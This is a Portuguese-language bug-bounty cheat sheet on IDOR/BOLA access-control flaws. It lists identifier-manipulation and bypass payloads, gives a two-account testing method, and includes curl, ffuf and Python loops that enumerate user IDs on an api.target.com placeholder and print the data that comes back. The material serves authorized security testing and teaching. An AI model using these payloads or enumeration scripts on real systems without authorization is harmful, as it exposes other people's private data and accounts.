# 🔓 IDOR — referência direta insegura a objetos

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Nota de precisão:** identificadores previsíveis e respostas HTTP 200 são indícios, não prova suficiente de IDOR: é necessário demonstrar acesso a um objeto sem a autorização devida. Um UUID ou hash não substitui essa verificação. IDOR e BOLA descrevem falhas relacionadas de controlo de acesso; a escolha do termo não demonstra uma vulnerabilidade. [Guia da PortSwigger](https://portswigger.net/web-security/access-control/idor). CRUD significa criar, ler, atualizar e eliminar; um *hash* é um resumo calculado a partir de dados. Os exemplos com setas incluem anotações explicativas, não comandos completos.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   Referência direta insegura a objetos
```

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Access_Control-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Authorization-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 📋 Índice

- [O que é IDOR](#-what-is-idor)
- [Onde procurar](#-where-to-look)
- [Tipos de identificadores e manipulação](#-id-types--manipulation)
- [Técnicas de contorno](#-bypass-techniques)
- [Metodologia de testes](#-testing-methodology)
- [Ferramentas e automatização](#-tools--automation)

---

<a id="-what-is-idor"></a>
## 🎯 O que é IDOR

Uma vulnerabilidade **IDOR** ocorre quando uma aplicação expõe referências diretas a objetos internos (registos de bases de dados, ficheiros, etc.) sem verificações de autorização adequadas.

### Impacto
- 🔴 **Roubo de dados** — Aceder a dados de outros utilizadores
- 🔴 **Escalada de privilégios** — Aceder a funcionalidades de administração
- 🔴 **Apropriação de contas** — Alterar outras contas
- 🔴 **Manipulação de dados** — Eliminar ou alterar registos

### IDOR e BOLA
| IDOR | BOLA |
|------|------|
| Termo tradicional | Termo usado na segurança de API |
| Falhas na autorização ao nível dos objetos |

---

<a id="-where-to-look"></a>
## 🔍 Onde procurar

### Parâmetros do URL
```
/user/profile?id=123
/api/users/123
/download?file=report_123.pdf
/account/settings/123
/orders/view/123
```

### Corpo de POST/PUT
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

### Cabeçalhos
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

### Parâmetros comuns
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

### Endpoints comuns
```
/api/users/{id}
/api/orders/{id}
/api/invoices/{id}
/api/documents/{id}
/api/messages/{id}
/download/{id}
/files/{id}
/profile/{id}
/settings/{id}
```

---

<a id="-id-types--manipulation"></a>
## 🔢 Tipos de identificadores e manipulação

### Identificadores sequenciais
```
# O caso mais comum: basta incrementar ou decrementar
/api/users/1
/api/users/2
/api/users/3

# Testar os limites
/api/users/0
/api/users/-1
/api/users/9999999
```

### UUIDs
```
# Verificar se são realmente aleatórios
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001  # Incrementar a parte final

# Procurar padrões
# UUIDs baseados no tempo (v1): previsíveis
# UUIDs aleatórios (v4): mais difíceis de adivinhar
```

### Identificadores codificados
```
# Base64
echo "123" | base64  → MTIz
echo "124" | base64  → MTI0

# Testar valores codificados
/api/users/MTIz  → descodificação = 123
/api/users/MTI0  → descodificação = 124

# Codificação hexadecimal
123 → 7b
124 → 7c
```

### Identificadores convertidos em hashes
```
# MD5 do identificador
/user/202cb962ac59075b964b07152d234b70  → md5(123)

# Experimentar algoritmos diferentes
# Verificar se o hash se baseia no identificador ou é aleatório
```

### Formatos personalizados
```
# Identificadores com prefixo
/user/USR_123
/order/ORD_456
/doc/DOC_789

# Baseado numa marca temporal
/file/20240128_001
/file/20240128_002
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Técnicas de contorno

### Manipulação de parâmetros
```bash
# Original
GET /api/users/123

# Variações
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

### Alteração do método HTTP
```bash
# Se GET estiver bloqueado, experimentar outros métodos
GET /api/users/124     → Bloqueado
POST /api/users/124    → Permitido?
PUT /api/users/124     → Permitido?
```

### Colocar em arrays ou objetos
```json
// Se id=124 estiver bloqueado, experimentar:
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

### Contornar validações através de codificação
```
# Codificar como URL
/api/users/12%34  → 124
/api/users/%31%32%34  → 124

# Aplicar codificação dupla
/api/users/%2531%2532%2534  → 124

# Unicode
/api/users/１２４  → 124 em caracteres de largura completa
```

### Manipulação de maiúsculas e minúsculas
```bash
/API/USERS/124
/Api/Users/124
/api/Users/124
```

### Combinação com path traversal (travessia de diretórios)
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

### Byte nulo
```
/api/users/124%00
/api/users/124%00.json
/api/users/124\x00
```

### Injeção de parâmetros JSON
```json
// Pedido original
{"user_id": 123, "action": "view"}

// Ataque
{"user_id": 124, "action": "view"}
{"user_id": "123\",\"target_id\": \"124", "action": "view"}
```

### HPP (poluição de parâmetros HTTP)
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

<a id="-testing-methodology"></a>
## 📋 Metodologia de testes

### Passo 1: identificar
```
1. Mapear todos os endpoints com referências a objetos
2. Registar todos os parâmetros que aparentem ser identificadores
3. Criar duas contas de teste (utilizador A e utilizador B)
```

### Passo 2: enumerar
```
1. Como utilizador A, registar os seus identificadores
2. Como utilizador B, registar os seus identificadores
3. Identificar padrões nos identificadores
```

### Passo 3: testar
```
1. Como utilizador A, tentar aceder aos objetos do utilizador B
2. Testar todas as operações CRUD:
   - Ler (GET)
   - Criar (POST)
   - Atualizar (PUT/PATCH)
   - Eliminar (DELETE)
```

### Passo 4: escalar
```
1. Experimentar identificadores de administração (frequentemente 1, admin, 0)
2. Experimentar valores especiais (null, undefined, *)
3. Combinar com outras vulnerabilidades
```

### Lista de verificação
```markdown
- [ ] Parâmetros do URL
- [ ] Parâmetros no corpo de POST
- [ ] Cabeçalhos (cookies e cabeçalhos personalizados)
- [ ] Campos de formulário ocultos
- [ ] Endpoints de API
- [ ] Transferências de ficheiros
- [ ] Funções de exportação
- [ ] Funções de eliminação
- [ ] Funções de administração
```

---

<a id="-tools--automation"></a>
## 🛠️ Ferramentas e automatização

### Extensões do Burp Suite
```
- Autorize (deteção automática de IDOR)
- AuthMatrix
- Auto Repeater
```

### Configuração do Autorize
```
1. Instalar a extensão Autorize
2. Copiar o cookie de sessão do utilizador B
3. Adicioná-lo ao Autorize
4. Navegar como utilizador A
5. O Autorize testa os pedidos com a sessão do utilizador B
```

### Testes manuais com curl
```bash
# Token do utilizador A
TOKEN_A="user_a_jwt_token"

# Tentar aceder ao recurso do utilizador B
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/users/124

# Percorrer os identificadores num ciclo
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN_A" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR: $i"
done
```

### ffuf para IDOR
```bash
# Identificadores numéricos
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w <(seq 1 1000) \
     -mc 200

# Com uma lista de palavras
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w ids.txt \
     -mc 200 -fc 403,404
```

### Script Python
```python
import requests

base_url = "https://api.target.com/users/"
headers = {"Authorization": "Bearer USER_A_TOKEN"}
my_id = 123

for i in range(1, 1000):
    if i == my_id:
        continue
    r = requests.get(f"{base_url}{i}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessible: {i}")
        print(r.json())
```

---

## 📊 Referência rápida

### Funcionalidades frequentemente vulneráveis
| Funcionalidade | Risco |
|----------|------|
| Consultar o perfil | Fuga de dados |
| Descarregar ficheiros | Acesso a ficheiros |
| Eliminar um item | Perda de dados |
| Atualizar definições | Apropriação de contas |
| Consultar encomendas | Violação de privacidade |
| Exportar dados | Roubo de dados em massa |

### O que incluir no relatório
```markdown
## IDOR no perfil de utilizador

**Endpoint:** GET /api/users/{id}

**Passos:**
1. Iniciar sessão como utilizador A (ID: 123)
2. Enviar o pedido GET /api/users/124
3. Observar que são devolvidos os dados do utilizador B

**Impacto:** Qualquer utilizador autenticado consegue aceder
às informações pessoais de todos os outros utilizadores.

**PoC:**
curl -H "Authorization: Bearer [token]" \
     https://api.target.com/users/124
```

---

## 💡 Conselhos práticos

1. **Utilize duas contas** — Efetue sempre os testes com duas contas
2. **Verifique todos os métodos** — GET, POST, PUT, DELETE
3. **Procure em todo o lado** — URLs, corpo, cabeçalhos e cookies
4. **Experimente casos limite** — 0, -1, null, undefined
5. **Combine ataques** — IDOR + CSRF, IDOR + XSS
6. **Verifique as exportações** — As exportações PDF e CSV são frequentemente vulneráveis
7. **APIs de aplicações móveis** — São frequentemente menos seguras do que as da Web

---

## 📚 Recursos

- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [PortSwigger — controlo de acesso](https://portswigger.net/web-security/access-control/idor)

---

<p align="center">
  <b>🔓 Encontre vulnerabilidades IDOR!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
